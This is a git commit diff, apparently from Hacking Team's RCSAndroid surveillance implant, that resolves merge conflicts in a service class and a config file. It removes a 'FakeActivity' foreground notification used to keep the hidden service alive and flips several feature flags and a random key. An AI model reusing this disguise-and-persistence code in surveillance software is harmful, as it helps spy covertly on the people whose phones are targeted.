a0988966f685b6c7e633b2d23152cf823743bb67
Quequero <a.pelliccione@hackingteam.it>
2012-02-24 10:00:18 +0100

    La notification needed e' ora dinamica

--- RCSAndroid/src/com/android/service/ServiceCore.java
+++ RCSAndroid/src/com/android/service/ServiceCore.java
@@ -86,8 +86,7 @@ public class ServiceCore extends Service {
 		needsNotification = isNotificationNeeded();
 		
 		Status.setAppContext(getApplicationContext());
-<<<<<<< HEAD
-		
+
 		if (needsNotification == true) {
 			Notification note = new Notification(R.drawable.notify_icon, "Ready to go?",
 					System.currentTimeMillis());
@@ -113,23 +112,6 @@ public class ServiceCore extends Service {
 		}
 		
 		return false;
-=======
-
-		if (Cfg.ACTIVITY) {
-			Notification note = new Notification(R.drawable.notify_icon, "Ready to go?", System.currentTimeMillis());
-
-			Intent i = new Intent(this, FakeActivity.class);
-
-			i.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-
-			PendingIntent pi = PendingIntent.getActivity(this, 0, i, 0);
-
-			note.setLatestEventInfo(this, "Fake Activity", "Now Playing: \"Sta cippa!\"", pi);
-			note.flags |= Notification.FLAG_NO_CLEAR;
-
-			startForeground(1337, note);
-		}
->>>>>>> d7b28a5f86018050525fd5b6e364a4ea4e0e4bd4
 	}
 
 	@Override
@@ -259,15 +241,10 @@ public class ServiceCore extends Service {
 
 		core.Stop();
 		core = null;
-<<<<<<< HEAD
 		
 		if (needsNotification == true) {
 			stopForeground(true);
 		}
-=======
-
-		stopForeground(true);
->>>>>>> d7b28a5f86018050525fd5b6e364a4ea4e0e4bd4
 	}
 
 	private void setBackground() {
--- RCSAndroid/src/com/android/service/auto/Cfg.java
+++ RCSAndroid/src/com/android/service/auto/Cfg.java
@@ -4,18 +4,12 @@ public class Cfg {
 	//ATTENZIONE, NON CAMBIARE A MANO LA VARIABILE DEBUG, VIENE RISCRITTA DA ANT
 	public static final boolean DEBUG = true;
 	public static final boolean EXCEPTION = true;
-	public static final boolean EXP = true;
-	public static final boolean DEMO = true;
+	public static final boolean EXP = false;
+	public static final boolean DEMO = false;
 	public static final boolean KEYS = true;
-<<<<<<< HEAD
-	public static final boolean FILE = false;
-	public static final String RANDOM = "5A5C3BE3738F3CD9";
-=======
 	public static final boolean FILE = true;
 	public static final boolean ACTIVITY = false;
 	public static final boolean MICFILE = false;
 	
-	public static final String RANDOM = "4702357988345512";
-
->>>>>>> d7b28a5f86018050525fd5b6e364a4ea4e0e4bd4
+	public static final String RANDOM = "038429E23B8754FF";
 }
